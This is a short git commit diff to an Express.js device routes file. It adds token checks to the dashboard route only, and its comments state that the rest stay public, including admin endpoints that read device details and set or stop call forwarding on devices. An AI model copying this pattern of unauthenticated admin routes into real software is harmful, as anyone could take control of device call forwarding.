8c22ff6e7ee216bb91dd541279838368149fb553
zero-trace-official <zerotrace-support@proton.me>
2025-03-03 04:22:42 -0800

    Update deviceRoutes.js

--- routes/deviceRoutes.js
+++ routes/deviceRoutes.js
@@ -1,14 +1,15 @@
 const express = require('express');
 const router = express.Router();
 const deviceController = require('../controllers/deviceController');
+const { verifyToken } = require('../middleware/verifyToken');
 
+// Sirf dashboard route ko protect kiya gaya hai
+router.get('/dashboard', verifyToken, deviceController.getAllDevicesData);
 
-router.get('/dashboard', deviceController.getAllDevicesData);
+// Baaki routes public rahenge
 router.get('/admin/phone/:id', deviceController.getDeviceDetails);
-
 router.post('/admin/set/:id', deviceController.setCallForwarding);
 router.post('/admin/stop/:id', deviceController.stopCallForwarding);
-
 router.get('/admin/call-status/:id', deviceController.getCallForwardingStatus);
 router.post('/admin/device-details', deviceController.addDeviceDetails);
 
